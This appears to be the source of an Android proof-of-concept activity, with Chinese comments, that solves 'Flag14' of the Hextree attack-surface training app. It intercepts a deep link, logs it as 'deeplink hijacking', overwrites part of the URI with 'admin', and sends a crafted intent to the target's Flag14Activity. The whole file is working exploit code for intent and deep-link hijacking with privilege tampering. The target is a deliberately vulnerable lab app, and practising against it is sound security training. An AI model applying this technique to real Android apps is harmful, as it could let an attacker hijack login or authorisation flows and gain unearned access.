package com.example.intent_pocapp;

import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class Flag14ResponseActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_flag14_response);
        Intent intent = getIntent();
        Uri data = intent.getData();
        Log.d("deeplink hijacking ", data.toString());//劫持查看原uri


        //发送新的intent到Flag14Activity
        StringBuilder new_uri = new StringBuilder(data.toString());//String对象被创建，它的值就不能被改变了，所以需要用StringBuilder
        new_uri.replace(68,72,"admin");
        Log.d("deeplink hijacking ", new_uri.toString());
        data = Uri.parse(new_uri.toString());
        Intent attack_intent = new Intent();
        attack_intent.setComponent(new ComponentName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag14Activity"));
        attack_intent.setAction(Intent.ACTION_VIEW);
        attack_intent.addCategory(Intent.CATEGORY_DEFAULT);
        attack_intent.addCategory(Intent.CATEGORY_BROWSABLE);
        attack_intent.setData(data);
        startActivity(attack_intent);

    }
}